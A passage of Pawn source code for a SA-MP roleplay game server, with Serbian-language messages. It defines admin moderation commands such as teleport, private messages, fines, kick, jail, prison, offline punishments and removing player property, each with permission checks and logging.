	    if( igrac == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	    if(PlayerInfo[playerid][xAdmin] < PlayerInfo[igrac][xAdmin]) return SendErrorMessage(playerid, "Ne mozes portati jaceg admina do sebe!");

		if( PlayerInfo[ igrac ][ xZatvor ] != 0 && PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Ne mozes da teleportujes igraca iz jaila." );

        if(RanjenIgrac[igrac]) return SendErrorMessage(playerid, "Igrac je ranjen! Mozes samo do njega!");
        if(KoristiKran[igrac]) return SendErrorMessage(playerid, "Igrac koristi kran!");
        if(PlayerInfo[igrac][xParadox] == 1) return SendErrorMessage(playerid, "Ne mozes da teleportujes igraca koji je u paradoxu!");

		if( uFirmi[ playerid ] != -1 ) uFirmi[ igrac ] = uFirmi[ playerid ];
		
		if( uInterijeru[ playerid ] != -1 ) uInterijeru[ igrac ] = uInterijeru[ playerid ];

		GetPlayerPos( playerid, x, y, z );

        if( GetPlayerState( igrac ) == 2 ) {
            Novi_SetVehiclePos( GetPlayerVehicleID( igrac ), x+3, y+3, z );
            SetPlayerInterior( igrac, GetPlayerInterior( playerid ) );
            SetPlayerVirtualWorld( igrac, GetPlayerVirtualWorld( playerid ) );
        }
        else {
    	    Novi_SetPlayerPos( igrac, x+1, y+1, z );
    		SetPlayerInterior( igrac, GetPlayerInterior( playerid ) );
    		SetPlayerVirtualWorld( igrac, GetPlayerVirtualWorld( playerid ) );
        }
		SendInfoMessage( playerid, "Teleportirali ste igraca: %s do sebe", ImeIgraca( igrac ) );
		SendInfoMessage( igrac, "%s vas je  teleportovao do sebe.", ImeIgraca( playerid ) );
		
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) {
			format( globalstring, sizeof( globalstring ), "GETHERE | %s je portao do sebe igraca: %s", ImeIgraca( playerid ), ImeIgraca( igrac ) );
			RPTChatVlasnik( NARACRVENA, globalstring );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

CMD:pm( playerid, params[] ) {
	new id, apmtext[128], string1[ 234 ];
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( sscanf( params, "us[128]", id, apmtext ) ) return SendUsageMessage( playerid, "/pm [ ID/Deo imena ] [ Text ]");
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi poslat poruku!");
	if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozes pisati suvlasniku i owneru!");
	AI[ playerid ][ aTPM ] ++;
	SendClientMessageEx( playerid, -1, ""col_crvena"Poslao si odg igracu %s: "col_white"%s", ImeIgraca( id ), apmtext );
	SendClientMessageEx( id, ZELENA, ""col_crvena"%s kaze: "col_white"%s", ImeIgraca(playerid), apmtext );
	format( string1 , sizeof( string1 ), ""col_red"|PM| %s [%d] -> %s : %s.", ImeIgraca( playerid ), PlayerInfo[playerid][xAdmin], ImeIgraca( id ), apmtext );
	AdminPoruka( 1, string1 );
	
    new string[ 128 ]; 
	format( string, sizeof( string ), "Admin %s -> Igrac: %s | Tekst: %s", ImeIgraca( playerid ), ImeIgraca( id ), apmtext );
	LogSave( "Ostalo/LogAODG.log", string );
	return 1;
}

CMD:hodg( playerid, params[] ) {
	new id, apmtext[128], string1[ 234 ];
	if( PlayerInfo[ playerid ][ xSupporter ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( sscanf( params, "us[128]", id, apmtext ) ) return SendUsageMessage( playerid, "/hodg [ ID/Deo imena ] [ Text ]");
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi poslat poruku!");
	if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
    if( PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozes pisati suvlasniku i owneru!");
	SendClientMessageEx( playerid, ZELENA, "{8EFF00}Poslao si odg igracu %s: "col_white"%s", ImeIgraca( id ), apmtext );
	SendClientMessageEx( id, ZELENA, "{8EFF00}Helper kaze: "col_white"%s", apmtext );
	format( string1 , sizeof( string1 ), "{AE7C5B}|HODG| %s -> %s : %s!.", ImeIgraca( playerid ), ImeIgraca( id ), apmtext );
	RPTChatPlus( SUPPORTER, string1 );
	AI[ playerid ][ aTPM ] ++;
    new string[ 128 ]; 
	format( string, sizeof( string ), "Helper %s -> Igrac: %s | Tekst: %s", ImeIgraca( playerid ), ImeIgraca( id ), apmtext );
	LogSave( "Ostalo/LogGODG.log", string );
	return 1;
}

alias:aclearwl("ocistiwl");
CMD:aclearwl( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/aclearwl [ ID/Deo imena ] ");
	    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika");
		PlayerInfo[ id ][ xWanted ] = 0;
	   	Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
	    strmid( ZlocinInfo[ id ][zPrijavio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ id ][zPocinio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ id ][zZlocin], "Nema", 0, strlen("Nema"), 255);
	    
	    SendInfoMessage( id, "Admin %s vam je skinuo wanted level.", ImeIgraca( playerid ) );
		SendInfoMessage( playerid, "Skinuli ste igracu %s wanted level.", ImeIgraca( id ) );
	    format( globalstring, sizeof( globalstring ), "WL | %s je skinuo wanted level igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	   	AdminPoruka( NARACRVENA, globalstring );
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:setint( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    new id, intid;
		if( sscanf( params, "ui", id, intid ) ) return SendUsageMessage( playerid, "/setint [ ID/Deo imena ] [ ID interiora ] ");
		if( id == IPI) return SendErrorMessage( playerid, "Igrac nije online!");
	    SetPlayerInterior( id, intid);
		SendInfoMessage( id, "Admin %s vam je postavio interior na %d.", ImeIgraca( playerid ), intid );
		SendInfoMessage( playerid, "Postavili ste igracu %s interior na %d.", ImeIgraca( id ), intid );
	    format( globalstring, sizeof( globalstring ), "INT | %s je postavio interior igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	   	AdminPoruka( NARACRVENA, globalstring );
   	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}
CMD:setvw( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    new id, vwid;
		if( sscanf( params, "ui", id, vwid ) ) return SendUsageMessage( playerid, "/setvw [ ID/Deo imena ] [ ID VW-a ]");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
	    SetPlayerVirtualWorld( id, vwid );
		SendInfoMessage( id, "Admin %s vam je postavio virtual world na %d.", ImeIgraca( playerid ), vwid );
		SendInfoMessage( playerid, "Postavili ste igracu %s virtual world na %d.", ImeIgraca( id ), vwid );
	    format( globalstring, sizeof( globalstring ), "VW | %s je postavio virtual world igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	   	AdminPoruka( NARACRVENA, globalstring );
   	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:fine( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	    new id, novac;
		if( sscanf( params, "ud", id, novac ) ) return SendUsageMessage( playerid, "/fine [ ID/Deo imena ] [ novac ] ");
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe kickovat!");
		if( novac < 1 ) return SendErrorMessage( playerid, "Novac ne moze ici ispod 1 !");
		if( novac > 10000000 ) return SendErrorMessage( playerid, "Novac ne moze ici preko 10000000 !");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozes kickati directore i ownere!");

		DajIgracuNovac( id, -novac );
		format( globalstring , sizeof( globalstring ), ""col_white"Fineovani ste! Admin: "col_crvena"%s "col_white"Novac: "col_crvena"-%d", ImeIgraca( playerid ), novac );
		SCM( id, -1, globalstring );
		SendClientMessageEx( playerid, -1, "Fineovali ste igraca "col_crvena"%s "col_white"Novac: "col_crvena"- %d",ImeIgraca( id ), novac );
		format( globalstring, sizeof( globalstring ), "FINE | %s je fineovao igraca: %s Novac: -%d", ImeIgraca( playerid ), ImeIgraca( id ), novac );
		AdminPoruka( NARACRVENA, globalstring );

        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je fineovao igraca %s | Novac: -%d", ImeIgraca( playerid ), ImeIgraca( id ), novac );
		LogSave( "Ostalo/LogFine.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:kick( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSpecAdmin] == 1 ) {
        
	    new id, reason[32];
		if( sscanf( params, "us[32]", id, reason ) ) return SendUsageMessage( playerid, "/kick [ ID/Deo imena ] [ Razlog ] ");
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe kickovat!");
		if( strlen( reason ) < 1 || strlen( reason ) > 31 ) return SendErrorMessage( playerid, "Razlog ne moze biti duzi od 31 simbola!");
		if( id == IPI ) return SendErrorMessage( playerid, "Igrac nije online!");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozes kickati directore i ownere!");
	    if(PlayerInfo[playerid][xSpecAdmin] == 1 && PlayerInfo[id][xAdmin] >= 1) return SendErrorMessage( playerid, "Ne mozes kickati admina!");

	    AI[ playerid ][ aTKick ]++;
	    ServerInfo[ KikovanihKorisnika ]++;

		format( globalstring , sizeof( globalstring ), ""col_white"Kickovani ste! Admin: "col_crvena"%s "col_white"Razlog: "col_crvena"%s", ImeIgraca( playerid ), reason);
		SCM( id, -1, globalstring );
		Novi_Kick( id );
		SendClientMessageEx( playerid, -1, "Kikovali ste igraca "col_crvena"%s "col_white"Razlog: "col_crvena"%s",ImeIgraca( id ), reason);
		format( globalstring, sizeof( globalstring ), "KICK | Admin je kickovao igraca: %s Razlog: %s", ImeIgraca( id ), reason );
		SCMA( NARACRVENA, globalstring );

		new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je kikovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), reason );
		LogSave( "Ostalo/LogKick.log", string );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}
CMD:unjail( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
        
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/unjail [ ID/Deo imena ]");
		if( id == IPI ) return SendUsageMessage( playerid, "Pogresan ID igraca." );
		if( PlayerInfo[ id ][ xZatvor ] != OBICAN_ZATVOR ) return SendErrorMessage( playerid, "Da bi oslobodili igraca on prvo mora biti u zatvoru." );

		Novi_SetPlayerPos( id, 1798.0217,-1578.1200,14.0855 );
        SetPlayerWorldBounds( id, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
		SetTimerEx( "SlobodnoSada", 6000, false, "i", id );
		SetCameraBehindPlayer( id );
		TogglePlayerControllable( id, false );
		SetPlayerInterior( id, 0 );
		SetPlayerVirtualWorld( id, 0 );

		PlayerInfo[ id ][ xZatvor ] = 0;
		PlayerInfo[ id ][ xZatvorVreme ] = 0;
		GameTextForPlayer( id, "~g~Sloboda~n~~w~Pokusajte biti bolji gradjanin", 5000, 1);

	    AI[ playerid ][ aTUnjail ]++;

		SendClientMessageEx( id, SVETLOCRVENA, "Admin %s vas je oslobodio iz zatvora.", ImeIgraca( playerid ) );
		SendClientMessageEx( playerid, SVETLOCRVENA, "Oslobodili ste igraca %s iz zatvora.", ImeIgraca( id ) );
	    format( globalstring, sizeof( globalstring ), "UNJAIL | %s je oslobodio iz zatvora igraca %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	   	AdminPoruka( NARACRVENA, globalstring );
	   	
	   	new string[ 128 ]; 
	    format( string, sizeof( string ), "Admin %s je unjailovao igraca %s", ImeIgraca( playerid ), ImeIgraca( id ) );
	    LogSave( "Ostalo/LogUnJail.log", string );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

alias:prison("alcatraz", "area");
CMD:prison( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 3 ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id, vreme, razlog[40];
		if( sscanf( params, "uis[40]", id, vreme, razlog ) ) {
			SendUsageMessage( playerid, "/prison [ ID/Deo imena ] [ vreme(minuti) ] [ razlog ]");
			return 1;
	    }
	    if( id != INVALID_PLAYER_ID ) {
			if( IsPlayerConnected( id ) ) {
			    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozes zatvoriti clana Admin TEAM-a!");
				// if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme u arei ne moze biti manje od 1 sata.Stavite ga u jail onda!");
                // if( vreme > 120 ) return SendErrorMessage( playerid, "Vreme u arei ne moze biti vece od 120 sati!");

                if( PlayerInfo[ playerid ][ xSupporter ] >= 3 ) {
		            if( PlayerInfo[ id ][ xSupporter ] == 0 ) return SendErrorMessage( playerid, "Kao vodja Helpera mozes prisonovati samo helpere." );
		        }

                if( PlayerInfo[ id ][ xUbijen ] == 1 ) return SendErrorMessage( playerid, "Sacekajte igrac se leci." );

				ResetAllWeapons( id );
	    		PlayerInfo[ id ][ xZatvor ] = ALKATRAZ;
	   			PlayerInfo[ id ][ xZatvorVreme ] = vreme;
				ClearAnimations( id );
				if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_RHAND );
				SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
				PlayerCuffed[ id ] = 0;

				GameTextForPlayer( id, "~w~Dobro dosli u ~n~~r~Area51", 5000, 3 );

                new string[ 128 ]; 
				format( string, sizeof( string ), "Admin %s je prisonovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog );
				LogSave( "Ostalo/LogPrison.log", string );

				AI[ playerid ][ aTJail ]++;

                PlayerCP[ id ] = 0;

				new rand = random(sizeof(RandomPrison));
                Novi_SetPlayerPos(id, RandomPrison[ rand ][ 0 ], RandomPrison[ rand ][ 1 ],RandomPrison[ rand ][ 2 ] );
				SetPlayerWorldBounds( id, 3146.996582, 2866.935546, -2706.383789, -3017.336669 );
				PlayerInfo[ id ][ xWanted ] = 0;
				Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
				strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
	            GameTextForPlayer( id, "Ucitavanje ...", 1000, 4 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", id );
			    SetCameraBehindPlayer( id ); SetPlayerInterior( id, 0);
			    SetPlayerVirtualWorld( id, 1);
			    TogglePlayerControllable( id, 0 );
				SavePlayer( id );

				SendClientMessageEx( id, SVETLOCRVENA, "Admin vas je stavio u Area51 na %d minuta.Razlog: %s", vreme, razlog );
				SendClientMessageEx( playerid, SVETLOCRVENA, "Postavili ste igraca %s u Area51 na %d minuta.Razlog: %s", ImeIgraca( id ), vreme, razlog );
			    format( globalstring, sizeof( globalstring ), "PRISON | Admin je postavio igraca %s u Area51.", ImeIgraca( id ) );
			   	SCMA( NARACRVENA, globalstring );
			   	
			   	format( globalstring, sizeof( globalstring ), "APRISON | Admin %s je postavio igraca %s u Area51 na %d minuta.", ImeIgraca( playerid ), ImeIgraca( id ), vreme );
			   	AdminPoruka( NARACRVENA, globalstring );
			   	format( globalstring, sizeof( globalstring ), "APRISON | Razlog: %s.", razlog );
			   	AdminPoruka( NARACRVENA, globalstring );
			}
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:maknisastatsa( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 6  ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new vrsta, imeigraca[ 24 ], ifile[ 64 ];
		if( sscanf( params, "s[24]i", imeigraca, vrsta ) ) {
		    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			SendUsageMessage( playerid, "/maknisastatsa [ Ime_Prezime ] [ Vrsta ]");
			SCM( playerid, BELA, "[Vrste]: 1. Imovina I  || 2. Imovina II || 3. Imovina III");
			SCM( playerid, BELA, "[Vrste]: 4. Vozilo I || 5. Vozilo II || 6. Vozilo III");
			SCM( playerid, BELA, "[Vrste]: 7. Vozilo IV || 8. Firma || 9. Hotel");
	    	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
			return 1;
	    }
	    format( ifile, sizeof( ifile ), I_FILE, imeigraca );
	    if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da mu mozes maknuti online.");
			return 1;
		}
		if( vrsta == 1 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "Property1", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s imovinu 1 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa imovinu 1 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 2 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "Property2", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s imovinu 2 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa imovinu 2 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 3 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "Property3", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s imovinu 3 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa imovinu 3 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 4 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "VoziloID1", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s vozilo 1 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa vozilo 1 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 5 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "VoziloID2", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s vozilo 2 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa vozilo 2 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 6 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "VoziloID3", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s vozilo 3 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa vozilo 3 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 7 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "VoziloID4", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s vozilo 4 sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa vozilo 4 igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 8 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "FirmaID", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s firmu sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa firmu igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else if( vrsta == 9 ) {
		    new INI:File = INI_Open( ifile );
			INI_SetTag( File, "Informacije" );
		    INI_WriteInt( File, "HotelID", -1 );
	    	INI_Close( File );
	    	SendClientMessageEx( playerid, SVETLOCRVENA, "Maknuli ste offline korisniku %s hotel sa statsa.", imeigraca );

			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je maknuo sa statsa hotel igracu %s", ImeIgraca( playerid ), imeigraca );
			LogSave( "Ostalo/LogMakniSaStatsa.log", string1 );
		}
		else return SendErrorMessage( playerid, "Vrsta moze od 1 do 10." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offprison( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2  ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new vreme, razlog[40], imeigraca[ 24 ], ifile[ 64 ];
		if( sscanf( params, "s[24]is[40]", imeigraca, vreme, razlog ) ) {
			SendUsageMessage( playerid, "/offprison [ Ime_Prezime ] [ vreme(sati) ] [ razlog ]");
			return 1;
	    }
	    format( ifile, sizeof( ifile ), I_FILE, imeigraca );
	    if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}
		if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme u arei ne moze biti manje od 1 sata.Stavite ga u jail onda!");

        new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
	    INI_WriteInt( File, "Zatvor", ALKATRAZ );
    	INI_WriteInt( File, "ZatvorVreme", vreme*60 );
    	INI_WriteString( File, "OffPPrison", razlog );
    	INI_Close( File );

		AI[ playerid ][ aTJail ]++;

		SendClientMessageEx( playerid, SVETLOCRVENA, "Postavili ste offline igraca %s u Area51 na %d sati.Razlog: %s", imeigraca, vreme, razlog );

        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s je offprisonao igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog );
		LogSave( "Ostalo/LogOffPrison.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offjail( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2  ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new vreme, razlog[40], imeigraca[ 24 ], ifile[ 64 ];
		if( sscanf( params, "s[24]is[40]", imeigraca, vreme, razlog ) ) {
			SendUsageMessage( playerid, "/offjail [ Ime_Prezime ] [ vreme(minuti) ] [ razlog ]");
			return 1;
	    }
	    format( ifile, sizeof( ifile ), I_FILE, imeigraca );
	    if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}
		if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme u jailu ne moze biti manje od 1 minut.");

        new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
	    INI_WriteInt( File, "Zatvor", OBICAN_ZATVOR );
    	INI_WriteInt( File, "ZatvorVreme", vreme );
    	INI_WriteString( File, "OffPJail", razlog );
    	INI_Close( File );

		AI[ playerid ][ aTJail ]++;

		SendClientMessageEx( playerid, SVETLOCRVENA, "Postavili ste offline igraca %s u zatvor na %d minuta.Razlog: %s", imeigraca, vreme, razlog );

        new string[ 128 ];
		format( string, sizeof( string ), "Admin %s je offjailovao igraca %s | Razlog: %s", ImeIgraca( playerid ), imeigraca, razlog );
		LogSave( "Ostalo/LogOffJail.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

alias:unprison("areaizvadi");
CMD:unprison( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 4  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id;
		if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/unprison [ ID/Deo imena ]");
		if( PlayerInfo[ id ][ xZatvor ] != ALKATRAZ ) return SendErrorMessage( playerid, "Da bi oslobodili igraca on prvo mora biti u Area51." );

		SetPlayerInterior( id, 0 );
		Novi_SetPlayerPos( id, 1798.0217,-1578.1200,14.0855 );
		SetPlayerWorldBounds( id, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
		SetPlayerVirtualWorld( id, 0 );
		PlayerInfo[ id ][ xZatvor ] = 0;
		PlayerInfo[ id ][ xZatvorVreme ] = 0;
		GameTextForPlayer( id, "~g~Sloboda~n~~w~Pokusajte biti bolji gradjanin", 5000, 1);

	    AI[ playerid ][ aTUnjail ]++;

		SendClientMessageEx( id, SVETLOCRVENA, "Admin %s vas je oslobodio iz Area51.", ImeIgraca( playerid ) );
		SendClientMessageEx( playerid, SVETLOCRVENA, "Oslobodili ste igraca %s iz Area51.", ImeIgraca( id ) );
	    format( globalstring, sizeof( globalstring ), "UNPRISON | %s je oslobodio iz Area51 igraca %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	   	AdminPoruka( NARACRVENA, globalstring );
	   	
	   	new string[ 128 ]; 
  		format( string, sizeof( string ), "Admin %s je unprisonovao igraca %s", ImeIgraca( playerid ), ImeIgraca( id ) );
		LogSave( "Ostalo/LogUnPrison.log", string );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:jail( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSpecAdmin] == 1 ) {
		new id, time, razlog[40];
		if( sscanf(params, "uis[40]", id, time, razlog ) ) return SendUsageMessage( playerid, "/jail [ ID/Deo imena ] [ minute ] [ razlog ]");
		if( IsPlayerConnected( id ) ) {
			if( id != INVALID_PLAYER_ID ) {
			    if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes zatvoriti clana Admin TEAM-a!");
